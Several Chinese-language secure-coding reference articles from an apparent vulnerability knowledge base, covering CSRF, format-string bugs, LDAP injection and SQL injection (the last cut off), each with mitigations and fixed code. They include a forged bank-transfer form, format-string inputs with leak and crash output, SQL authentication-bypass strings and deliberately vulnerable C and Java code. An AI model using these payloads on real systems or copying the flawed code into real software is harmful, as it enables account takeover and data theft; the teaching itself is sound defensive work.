                <div class="toc">
<ul>
<li><a href="#_1">缺陷描述</a></li>
<li><a href="#_2">漏洞与风险</a></li>
<li><a href="#_3">缓解与预防</a></li>
<li><a href="#_4">漏洞利用威胁</a></li>
<li><a href="#_5">演示示例</a><ul>
<li><a href="#_6">漏洞代码示例</a></li>
</ul>
</li>
</ul>
</div>

            <div>
                
<h1 id="_1">缺陷描述</h1>
<p>跨站点请求伪造（CSRF）是一种攻击，它迫使最终用户在当前通过身份验证的Web应用程序上执行恶意的操作。 CSRF攻击专门针对状态改变的请求，而不是数据窃取，因为攻击者无法查看对伪造请求的响应。 借助社交工程的一些帮助（例如通过电子邮件或聊天发送链接），攻击者可能会欺骗Web应用程序的用户执行攻击者选择的操作。 如果受害者是普通用户，则成功的CSRF攻击可以强制用户执行状态更改请求，如转移资金，更改其电子邮件地址等等。 如果受害者是管理帐户，CSRF可能会危害整个Web应用程序。</p>
<h1 id="_2">漏洞与风险</h1>
<p>跨站点请求伪造后果将根据易受CSRF影响的功能性质而有所不同。攻击者可以有效地执行任何恶意的操作。 如果受害者是管理员或特权用户，则其后果可能包括完全控制Web应用程序，从而删除数据，卸载产品或使用它对所有产品的用户发动其他攻击。 </p>
<h1 id="_3">缓解与预防</h1>
<ol>
<li>使用经过审查的库或框架，不允许发生这种缺陷或提供使这种缺陷更容易避免的构造。例如，使用防御CSRF的库，例如OWASP CSRFGuard。</li>
<li>确保应用程序没有跨站脚本问题，因为大多数CSRF防御措施可以使用攻击者控制的脚本绕过。</li>
<li>为每个表单生成唯一的随机数，将随机数放入表单中，并在收到表单时验证随机数。</li>
<li>识别特别危险的操作。当用户执行危险操作时，请发送单独的确认请求以确保用户打算执行该操作。</li>
<li>不要将GET方法用于触发状态更改的任何请求。</li>
<li>检查HTTP Referer头以查看请求是否来自期望的页面。这可能会破坏合法的功能，因为用户或代理可能因为隐私原因而禁止发送Referer。</li>
</ol>
<h1 id="_4">漏洞利用威胁</h1>
<p>高危</p>
<h1 id="_5">演示示例</h1>
<h3 id="_6">漏洞代码示例</h3>
<p>假设您银行的网站提供了一个表格，允许从当前登录用户转账到另一个银行账户。例如，HTTP请求可能如下所示：</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4
5
6</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="nf">POST</span> <span class="nn">/transfer</span> <span class="kr">HTTP</span><span class="o">/</span><span class="m">1.1</span>
<span class="na">Host</span><span class="o">:</span> <span class="l">bank.example.com</span>
<span class="na">Cookie</span><span class="o">:</span> <span class="l">JSESSIONID=randomid; Domain=bank.example.com; Secure; HttpOnly</span>
<span class="na">Content-Type</span><span class="o">:</span> <span class="l">application/x-www-form-urlencoded</span>

amount=100.00&amp;routingNumber=1234&amp;account=9876
</pre></div>
</td></tr></table>
<p>现在假设你已经认证了该银行网站，然后在没有注销的情况下访问一个恶意网站。恶意的网站包含一个HTML页面，其格式如下：</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">"https://bank.example.com/transfer"</span> <span class="na">method=</span><span class="s">"post"</span><span class="nt">&gt;</span>
<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span>
    <span class="na">name=</span><span class="s">"amount"</span>
    <span class="na">value=</span><span class="s">"100.00"</span><span class="nt">/&gt;</span>
<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span>
    <span class="na">name=</span><span class="s">"routingNumber"</span>
    <span class="na">value=</span><span class="s">"evilsRoutingNumber"</span><span class="nt">/&gt;</span>
<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"hidden"</span>
    <span class="na">name=</span><span class="s">"account"</span>
    <span class="na">value=</span><span class="s">"evilsAccountNumber"</span><span class="nt">/&gt;</span>
<span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"submit"</span>
    <span class="na">value=</span><span class="s">"Win Money!"</span><span class="nt">/&gt;</span>
<span class="nt">&lt;/form&gt;</span>
</pre></div>
</td></tr></table>
<p>你点击提交按钮。在这个过程中，你无意间将100美元转让给恶意用户。 发生这种情况的原因是，虽然恶意网站无法看到您的Cookie，但与您的银行相关的Cookie仍会与请求一起发送。</p>
<p>修复建议：参考“缓解与预防”
引用
================</p>
<div class="footnote">
<hr/>
<ol>
<li id="fn-CWE352">
<p>https://cwe.mitre.org/data/definitions/352.html <a class="footnote-backref" href="#fnref-CWE352" title="Jump back to footnote 1 in the text">↩</a></p>
</li>
<li id="fn-OWASP">
<p>https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF).html <a class="footnote-backref" href="#fnref-OWASP" title="Jump back to footnote 2 in the text">↩</a></p>
</li>
</ol>
</div>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../../tag/c.html">C</a>
                <a href="../../../tag/c.html">C++</a>
                <a href="../../../tag/java.html">JAVA</a>
                <a href="../../../tag/cwe-352.html">CWE-352</a>
                <a href="../../../tag/find-sec-bugs.html">FIND-SEC-BUGS</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../../standard/c.html">c/c++</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues.html">安全问题</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues/input validation and representation.html">输入验证与表示</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE0085">格式化字符串漏洞</h1>
                <p>
                    在 2024-九月-28 发布于 <a href="../../../category/input-validation-and-representation.html">输入验证与表示</a> 分类

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#_1">缺陷描述</a></li>
<li><a href="#_2">漏洞与风险</a><ul>
<li><a href="#_3">拒绝服务、信息泄漏</a></li>
</ul>
</li>
<li><a href="#_4">漏洞利用威胁</a></li>
<li><a href="#_5">缓解与预防</a></li>
<li><a href="#_6">演示实例</a><ul>
<li><a href="#1">漏洞演示实例 1: 泄漏内存数据</a></li>
<li><a href="#2">漏洞演示实例 2：程序崩溃和拒绝服务</a></li>
<li><a href="#_7">漏洞代码修复示例</a></li>
<li><a href="#3">漏洞演示实例 3</a></li>
</ul>
</li>
<li><a href="#_8">引用</a></li>
</ul>
</div>

            <div>
                
<h1 id="_1">缺陷描述</h1>
<p>例如 C 语言的 <code>printf</code> 函数，Java 语言的 <code>String.format</code> 方法可以接受可变参数。其中一个参数指定了其他参数的数据解析方法，如果该参数可被外部随意控制，恶意构造的格式化字符串可以引起程序异常和崩溃、数据泄漏、甚至是代码执行。</p>
<h1 id="_2">漏洞与风险</h1>
<h4 id="_3">拒绝服务、信息泄漏</h4>
<p>格式化字符串可以包含任意数量的数值指定符，程序会根据指定符不断处理和输出程序栈上的内容，最后可能泄漏关键的程序信息  <br/>
攻击者更加可以包含字符串指定符，程序会把内存数据当作一个合法指针，进而解析指针指向的字符串内容。程序并不会检查指针的合法性，一旦解析到非法指针，程序就会崩溃。  </p>
<h1 id="_4">漏洞利用威胁</h1>
<p>高危</p>
<h1 id="_5">缓解与预防</h1>
<ul>
<li>不要使用外部可控的格式化字符串参数</li>
<li>增加过滤和净化逻辑阻止恶意利用</li>
</ul>
<h1 id="_6">演示实例</h1>
<h3 id="1">漏洞演示实例 1: 泄漏内存数据</h3>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4
5
6
7
8
9</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span>
<span class="p">{</span>
  <span class="kt">int</span> <span class="n">a</span> <span class="o">=</span> <span class="mh">0xAABBCCDD</span><span class="p">;</span>
  <span class="kt">int</span> <span class="n">b</span> <span class="o">=</span> <span class="mh">0xFFEE4242</span><span class="p">;</span>
  <span class="n">printf</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
  <span class="k">return</span> <span class="n">a</span> <span class="o">+</span> <span class="n">b</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
</td></tr></table>
<p>程序执行输出: </p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3</pre></div></td><td class="code"><div class="highlight"><pre><span></span>$ ./a.out <span class="s2">"%p %p %p %p %p %p %p %p %p  "</span>
0x7ffeccbb42f8 0x7ffeccbb4310 <span class="o">(</span>nil<span class="o">)</span> 0x4005e0 0x7f287164bab0 <span class="se">\</span>
0x7ffeccbb42f8 0x200400430 0x7ffeccbb42f0 0xffee4242aabbccdd  
</pre></div>
</td></tr></table>
<p>在程序输出中最后一个数值 (0xffee4242aabbccdd) 其实就是变量 <code>a</code> 和 <code>b</code> 的值。这个例子展示了格式化字符串漏洞泄漏内存信息的能力。</p>
<h3 id="2">漏洞演示实例 2：程序崩溃和拒绝服务</h3>
<p>使用和实例 1 同样的代码，换上字符串指定符可以令程序崩溃</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2</pre></div></td><td class="code"><div class="highlight"><pre><span></span>$ ./a.out <span class="s2">"%s %s %s %s %s %s %s %s %s  "</span>
Segmentation fault <span class="o">(</span>core dumped<span class="o">)</span>
</pre></div>
</td></tr></table>
<p>程序根据 <code>%s</code> 字符串指定符把数据解析成字符串指针，并会读取指针指向的内容。一旦遇上非法指针，程序将会崩溃。</p>
<h3 id="_7">漏洞代码修复示例</h3>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span>
<span class="p">{</span>
  <span class="kt">int</span> <span class="n">a</span> <span class="o">=</span> <span class="mh">0xAABBCCDD</span><span class="p">;</span>
  <span class="kt">int</span> <span class="n">b</span> <span class="o">=</span> <span class="mh">0xFFEE4242</span><span class="p">;</span>

  <span class="n">printf</span><span class="p">(</span><span class="s">"%s"</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
  <span class="k">return</span> <span class="n">a</span> <span class="o">+</span> <span class="n">b</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>
</td></tr></table>
<p>格式串一般来说应当是固定的字符串。当外部来源的字符串需要输出时，应当在格式串中用 <code>%s</code> 来输出，而不是把字符串本身当作格式串。 </p>
<h3 id="3">漏洞演示实例 3</h3>
<p>上面的例子对Java也适用：</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4
5
6
7
8</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">java.io.</span><span class="o">*</span><span class="p">;</span>
<span class="k">class</span> <span class="nc">Example</span> <span class="p">{</span>
  <span class="n">public</span> <span class="n">static</span> <span class="n">void</span> <span class="n">main</span><span class="p">(</span><span class="n">String</span><span class="p">[]</span> <span class="n">args</span><span class="p">)</span> <span class="p">{</span>
    <span class="nb">int</span> <span class="n">a</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="nb">int</span> <span class="n">b</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
    <span class="n">System</span><span class="o">.</span><span class="n">out</span><span class="o">.</span><span class="n">printf</span><span class="p">(</span><span class="n">args</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">);</span>
  <span class="p">}</span>
<span class="p">}</span>
</pre></div>
</td></tr></table>
<p>应该被修复为</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1
2
3
4
5
6
7
8</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">java.io.</span><span class="o">*</span><span class="p">;</span>
<span class="k">class</span> <span class="nc">Example</span> <span class="p">{</span>
  <span class="n">public</span> <span class="n">static</span> <span class="n">void</span> <span class="n">main</span><span class="p">(</span><span class="n">String</span><span class="p">[]</span> <span class="n">args</span><span class="p">)</span> <span class="p">{</span>
    <span class="nb">int</span> <span class="n">a</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="nb">int</span> <span class="n">b</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
    <span class="n">System</span><span class="o">.</span><span class="n">out</span><span class="o">.</span><span class="n">printf</span><span class="p">(</span><span class="s2">"</span><span class="si">%s%d%d</span><span class="s2">"</span><span class="p">,</span> <span class="n">args</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">);</span>
  <span class="p">}</span>
<span class="p">}</span>
</pre></div>
</td></tr></table>
<h1 id="_8">引用</h1>
<div class="footnote">
<hr/>
<ol>
<li id="fn-CWE">
<p>http://cwe.mitre.org/data/definitions/134.html <a class="footnote-backref" href="#fnref-CWE" title="Jump back to footnote 1 in the text">↩</a></p>
</li>
</ol>
</div>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../../tag/c.html">C</a>
                <a href="../../../tag/cpp.html">CPP</a>
                <a href="../../../tag/java.html">Java</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../../standard/c.html">c/c++</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues.html">安全问题</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues/input validation and representation.html">输入验证与表示</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE0082">LDAP 注入</h1>
                <p>
                    在 2024-九月-28 发布于 <a href="../../../category/input-validation-and-representation.html">输入验证与表示</a> 分类

                    &#8226; 1 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#_1">缺陷描述</a></li>
<li><a href="#_2">漏洞与风险</a></li>
<li><a href="#_3">缓解与预防</a></li>
<li><a href="#_4">漏洞利用威胁</a></li>
<li><a href="#_5">演示实例</a><ul>
<li><a href="#_6">漏洞代码示例</a></li>
<li><a href="#_7">漏洞代码修复示例</a></li>
</ul>
</li>
<li><a href="#_8">引用</a></li>
</ul>
</div>

            <div>
                
<h1 id="_1">缺陷描述</h1>
<p>轻量级目录访问协议（LDAP）允许应用程序远程执行操作，例如搜索和修改目录中的记录。 LDAP注入源自输入清理和验证不足，并允许恶意用户使用目录服务收集受限信息。</p>
<p>白名单可用于将输入限制为有效字符列表。下表中列出了必须从白名单中排除的字符和字符序列（包括Java命名和目录接口（JNDI）元字符和LDAP特殊字符）。</p>
<p>从白名单中排除的字符和序列：</p>
<table>
<thead>
<tr>
<th>字符</th>
<th>字符序列</th>
</tr>
</thead>
<tbody>
<tr>
<td>#</td>
<td>Hash character at the beginning of the string</td>
</tr>
<tr>
<td>' and "</td>
<td>Single and double quote</td>
</tr>
<tr>
<td>( and )</td>
<td>Round braces</td>
</tr>
<tr>
<td>+ and *</td>
<td>Addition and multiplication operators</td>
</tr>
<tr>
<td>, and ;</td>
<td>Comma and semicolon</td>
</tr>
<tr>
<td>/ and \</td>
<td>Forward slash and backslash</td>
</tr>
<tr>
<td>&lt; and &gt;</td>
<td>Angle brackets</td>
</tr>
<tr>
<td>\\</td>
<td>Double slashes*</td>
</tr>
<tr>
<td>\u0000</td>
<td>Unicode NULL character</td>
</tr>
<tr>
<td>space</td>
<td>Space character at beginning or end of string</td>
</tr>
<tr>
<td>这是一个字符序列。</td>
<td></td>
</tr>
</tbody>
</table>
<h1 id="_2">漏洞与风险</h1>
<p>下表列出了与缺陷相关的不同后果。'范围'标识了被违反的应用程序安全区域，而'影响'则描述了如果攻击者成功利用此漏洞所产生的负面技术影响。   </p>
<table>
<thead>
<tr>
<th>范围</th>
<th>影响</th>
</tr>
</thead>
<tbody>
<tr>
<td>机密性</td>
<td>执行未经授权的代码或命令; 阅读应用数据; 修改应用数据</td>
</tr>
<tr>
<td>完整可用性</td>
<td>攻击者可能包含更改LDAP查询的输入，该查询允许执行意外的命令或代码，允许读取或修改敏感数据或导致其他意外行为</td>
</tr>
</tbody>
</table>
<h1 id="_3">缓解与预防</h1>
<p>1 使用正确的LDAP编码函数
2 使用自动从LDAP注入进行保护的框架
3 额外防御</p>
<h1 id="_4">漏洞利用威胁</h1>
<p>高危</p>
<h1 id="_5">演示实例</h1>
<h3 id="_6">漏洞代码示例</h3>
<p>这个漏洞代码示例允许方法searchRecord()的调用者使用LDAP协议在目录中搜索记录。字符串过滤器用于过滤与调用者提供的用户名和密码匹配的条目的结果集。</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="c1">// String userSN = "S*"; // Invalid</span>
<span class="c1">// String userPassword = "*"; // Invalid</span>
<span class="kd">public</span> <span class="kd">class</span> <span class="nc">LDAPInjection</span> <span class="o">{</span>       
  <span class="kd">private</span> <span class="kt">void</span> <span class="nf">searchRecord</span><span class="o">(</span><span class="n">String</span> <span class="n">userSN</span><span class="o">,</span> <span class="n">String</span> <span class="n">userPassword</span><span class="o">)</span>  
  <span class="kd">throws</span> <span class="n">NamingException</span> <span class="o">{</span>        
    <span class="n">Hashtable</span><span class="o">&lt;</span><span class="n">String</span><span class="o">,</span> <span class="n">String</span><span class="o">&gt;</span>  <span class="n">env</span> <span class="o">=</span> <span class="k">new</span> <span class="n">Hashtable</span><span class="o">&lt;</span><span class="n">String</span><span class="o">,</span> <span class="n">String</span><span class="o">&gt;();</span>
    <span class="n">env</span><span class="o">.</span><span class="na">put</span><span class="o">(</span><span class="n">Context</span><span class="o">.</span><span class="na">INITIAL_CONTEXT_FACTORY</span><span class="o">,</span> <span class="s">"com.sun.jndi.ldap.LdapCtxFactory"</span><span class="o">);</span>
    <span class="k">try</span> <span class="o">{</span>
      <span class="n">DirContext</span> <span class="n">dctx</span> <span class="o">=</span> <span class="k">new</span> <span class="n">InitialDirContext</span><span class="o">(</span><span class="n">env</span><span class="o">);</span>

      <span class="n">SearchControls</span> <span class="n">sc</span> <span class="o">=</span> <span class="k">new</span> <span class="n">SearchControls</span><span class="o">();</span>
      <span class="n">String</span><span class="o">[]</span> <span class="n">attributeFilter</span> <span class="o">=</span> <span class="o">{</span><span class="s">"cn"</span><span class="o">,</span> <span class="s">"mail"</span><span class="o">};</span>
      <span class="n">sc</span><span class="o">.</span><span class="na">setReturningAttributes</span><span class="o">(</span><span class="n">attributeFilter</span><span class="o">);</span>
      <span class="n">sc</span><span class="o">.</span><span class="na">setSearchScope</span><span class="o">(</span><span class="n">SearchControls</span><span class="o">.</span><span class="na">SUBTREE_SCOPE</span><span class="o">);</span>
      <span class="n">String</span> <span class="n">base</span> <span class="o">=</span> <span class="s">"dc=example,dc=com"</span><span class="o">;</span>

      <span class="c1">// The following resolves to (&amp;(sn=S*)(userPassword=*))     </span>
      <span class="n">String</span> <span class="n">filter</span> <span class="o">=</span> <span class="s">"(&amp;(sn="</span> <span class="o">+</span> <span class="n">userSN</span> <span class="o">+</span> <span class="s">")(userPassword="</span> <span class="o">+</span> <span class="n">userPassword</span> <span class="o">+</span> <span class="s">"))"</span><span class="o">;</span>

      <span class="n">NamingEnumeration</span><span class="o">&lt;?&gt;</span> <span class="n">results</span> <span class="o">=</span> <span class="n">dctx</span><span class="o">.</span><span class="na">search</span><span class="o">(</span><span class="n">base</span><span class="o">,</span> <span class="n">filter</span><span class="o">,</span> <span class="n">sc</span><span class="o">);</span>
      <span class="k">while</span> <span class="o">(</span><span class="n">results</span><span class="o">.</span><span class="na">hasMore</span><span class="o">())</span> <span class="o">{</span>
        <span class="n">SearchResult</span> <span class="n">sr</span> <span class="o">=</span> <span class="o">(</span><span class="n">SearchResult</span><span class="o">)</span> <span class="n">results</span><span class="o">.</span><span class="na">next</span><span class="o">();</span>
        <span class="n">Attributes</span> <span class="n">attrs</span> <span class="o">=</span> <span class="o">(</span><span class="n">Attributes</span><span class="o">)</span> <span class="n">sr</span><span class="o">.</span><span class="na">getAttributes</span><span class="o">();</span>
        <span class="n">Attribute</span> <span class="n">attr</span> <span class="o">=</span> <span class="o">(</span><span class="n">Attribute</span><span class="o">)</span> <span class="n">attrs</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="s">"cn"</span><span class="o">);</span>
        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">attr</span><span class="o">);</span>
        <span class="n">attr</span> <span class="o">=</span> <span class="o">(</span><span class="n">Attribute</span><span class="o">)</span> <span class="n">attrs</span><span class="o">.</span><span class="na">get</span><span class="o">(</span><span class="s">"mail"</span><span class="o">);</span>
        <span class="n">System</span><span class="o">.</span><span class="na">out</span><span class="o">.</span><span class="na">println</span><span class="o">(</span><span class="n">attr</span><span class="o">);</span>
      <span class="o">}</span>    
      <span class="n">dctx</span><span class="o">.</span><span class="na">close</span><span class="o">();</span>
    <span class="o">}</span> <span class="k">catch</span> <span class="o">(</span><span class="n">NamingException</span> <span class="n">e</span><span class="o">)</span> <span class="o">{</span>
      <span class="c1">// Forward to handler</span>
    <span class="o">}</span>
  <span class="o">}</span> 
<span class="o">}</span>
</pre></div>
</td></tr></table>
<p>如上所述，当恶意用户输入特制输入时，此基本身份验证方案无法将搜索查询的输出限制为用户具有访问权限的信息。</p>
<h3 id="_7">漏洞代码修复示例</h3>
<p>此漏洞代码修复示例使用白名单来清理用户输入，以便过滤器字符串仅包含有效字符。在此代码中，userSN可能只包含字母和空格，而密码可能只包含字母数字字符。</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
 2
 3
 4
 5
 6
 7
 8
 9
10
11
12
13
14</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="c1">// String userSN = "Sherlock Holmes"; // Valid</span>
<span class="c1">// String userPassword = "secret2";   // Valid</span>

<span class="c1">// ... beginning of LDAPInjection.searchRecord()...</span>
<span class="n">sc</span><span class="o">.</span><span class="na">setSearchScope</span><span class="o">(</span><span class="n">SearchControls</span><span class="o">.</span><span class="na">SUBTREE_SCOPE</span><span class="o">);</span>
<span class="n">String</span> <span class="n">base</span> <span class="o">=</span> <span class="s">"dc=example,dc=com"</span><span class="o">;</span>

<span class="k">if</span> <span class="o">(!</span><span class="n">userSN</span><span class="o">.</span><span class="na">matches</span><span class="o">(</span><span class="s">"[\\w\\s]*"</span><span class="o">)</span> <span class="o">||</span> <span class="o">!</span><span class="n">userPassword</span><span class="o">.</span><span class="na">matches</span><span class="o">(</span><span class="s">"[\\w]*"</span><span class="o">))</span> <span class="o">{</span>
  <span class="k">throw</span> <span class="k">new</span> <span class="n">IllegalArgumentException</span><span class="o">(</span><span class="s">"Invalid input"</span><span class="o">);</span>
<span class="o">}</span>

<span class="n">String</span> <span class="n">filter</span> <span class="o">=</span> <span class="s">"(&amp;(sn = "</span> <span class="o">+</span> <span class="n">userSN</span> <span class="o">+</span> <span class="s">")(userPassword="</span> <span class="o">+</span> <span class="n">userPassword</span> <span class="o">+</span> <span class="s">"))"</span><span class="o">;</span>

<span class="c1">// ... remainder of LDAPInjection.searchRecord()...    </span>
</pre></div>
</td></tr></table>
<p>当数据库字段（例如密码）必须包含特殊字符时，确保将真实数据以过滤后的形式存储在数据库中以及在进行验证或比较之前对任何用户输入进行规范化至关重要。 不建议在没有全面的标准化和基于白名单的例程的情况下使用在JNDI和LDAP中具有特殊含义的字符。 在将特殊字符添加到白名单表达式之前，必须将其转换为已过滤后的安全值，然后才能对输入进行验证。同样，用户输入的标准化应该在验证步骤之前进行。</p>
<h1 id="_8">引用</h1>
<div class="footnote">
<hr/>
<ol>
<li id="fn-CEW">
<p>http://cwe.mitre.org/data/definitions/116.html <a class="footnote-backref" href="#fnref-CEW" title="Jump back to footnote 1 in the text">↩</a></p>
</li>
<li id="fn-OWASP">
<p>https://www.owasp.org/index.php/Top_10-2017_A1-Injection <a class="footnote-backref" href="#fnref-OWASP" title="Jump back to footnote 2 in the text">↩</a></p>
</li>
</ol>
</div>
            </div>
            <div class="tag-cloud">
                <p>
                <a href="../../../tag/web.html">Web</a>
                <a href="../../../tag/java.html">Java</a>
                <a href="../../../tag/injection.html">Injection</a>
                <a href="../../../tag/cwe-116.html">CWE-116</a>
                <a href="../../../tag/find-sec-bugs.html">FIND-SEC-BUGS</a>
                </p>
            </div>
        </article>

        <article class="single">
            <header>
                <div class="breadcrumb">
                <ol>
                    <li>
                        <a href="../../../standard/c.html">c/c++</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues.html">安全问题</a>
                    </li>
                    <li>
                            <a href="../../../subcategory/c/security issues/input validation and representation.html">输入验证与表示</a>
                    </li>
                </ol>
                
                </div>

                <h1 id="PE0081">SQL 注入</h1>
                <p>
                    在 2024-九月-28 发布于 <a href="../../../category/input-validation-and-representation.html">输入验证与表示</a> 分类

                    &#8226; 2 min read
                </p>
            </header>

                <div class="toc">
<ul>
<li><a href="#_1">缺陷描述</a></li>
<li><a href="#_2">漏洞与风险</a></li>
<li><a href="#_3">缓解与预防</a></li>
<li><a href="#_4">漏洞利用威胁</a></li>
<li><a href="#_5">演示实例</a><ul>
<li><a href="#_6">漏洞代码示例</a></li>
<li><a href="#_7">漏洞代码修复示例</a></li>
</ul>
</li>
<li><a href="#_8">引用</a></li>
</ul>
</div>

            <div>
                
<h1 id="_1">缺陷描述</h1>
<p>SQL注入漏洞在SQL查询的元素源自不可信源的应用程序中出现。如果没有预防措施，不可信数据可能会恶意更改查询，导致信息泄漏或数据修改。</p>
<p>假设系统通过向SQL数据库发出以下查询来对用户进行身份验证。 如果查询返回任何结果，则认证成功; 否则，认证失败。</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">db_user</span> <span class="k">WHERE</span> <span class="n">username</span><span class="o">=</span><span class="s1">'&lt;USERNAME&gt;'</span> <span class="k">AND</span>  <span class="n">password</span><span class="o">=</span><span class="s1">'&lt;PASSWORD&gt;'</span>
</pre></div>
</td></tr></table>
<p>假设攻击者可以用<username>和<password>替换任意字符串。 在这种情况下，可以通过向以下<username>提供任意密码来绕过认证机制：</username></password></username></p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="n">validuser</span><span class="s1">' OR '</span><span class="mi">1</span><span class="s1">'='</span><span class="mi">1</span>
</pre></div>
</td></tr></table>
<p>身份验证例程动态构建以下查询：</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">db_user</span> <span class="k">WHERE</span> <span class="n">username</span><span class="o">=</span><span class="s1">'validuser'</span> <span class="k">OR</span> <span class="s1">'1'</span><span class="o">=</span><span class="s1">'1'</span> <span class="k">AND</span> <span class="n">password</span><span class="o">=</span><span class="s1">'&lt;PASSWORD&gt;'</span>
</pre></div>
</td></tr></table>
<p>如果validuser是有效的用户名，则此SELECT语句会在表中生成有效用户记录。从而不再检查密码是否正确，因为<code>username='validuser'</code>为true; 因此，OR之后的语句就不会被验证。只要OR之后的组件生成语法上正确的SQL表达式，攻击者就被授予validuser的访问权限。</p>
<p>同样，攻击者可以用任意用户名为<password>提供以下字符串：</password></p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="s1">' OR '</span><span class="mi">1</span><span class="s1">'='</span><span class="mi">1</span>
</pre></div>
</td></tr></table>
<p>产生下面的查询语句：</p>
<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre>1</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="k">SELECT</span> <span class="o">*</span> <span class="k">FROM</span> <span class="n">db_user</span> <span class="k">WHERE</span> <span class="n">username</span><span class="o">=</span><span class="s1">'&lt;USERNAME&gt;'</span> <span class="k">AND</span> <span class="n">password</span><span class="o">=</span><span class="s1">''</span> <span class="k">OR</span> <span class="s1">'1'</span><span class="o">=</span><span class="s1">'1'</span>
</pre></div>
</td></tr></table>
<p><code>'1'='1'</code>总是计算为真，导致查询产生数据库中的每一行。在这种情况下，攻击者将被认证而不需要有效的用户名或密码。</p>
<h1 id="_2">漏洞与风险</h1>
<p>SQL注入是一种代码注入技术，用于攻击数据驱动的应用程序，其中恶意的SQL语句被插入到输入字段中从而被恶意执行。（例如将数据库内容转储给攻击者）。SQL注入必须利用应用程序软件中的安全漏洞，例如，当用户输入不正确地过滤嵌入SQL语句中的字符串文字转义字符或者用户输入未被强类型化和意外执行时。 SQL注入通常被称为网站的攻击媒介，但可以用来攻击任何类型的SQL数据库。</p>
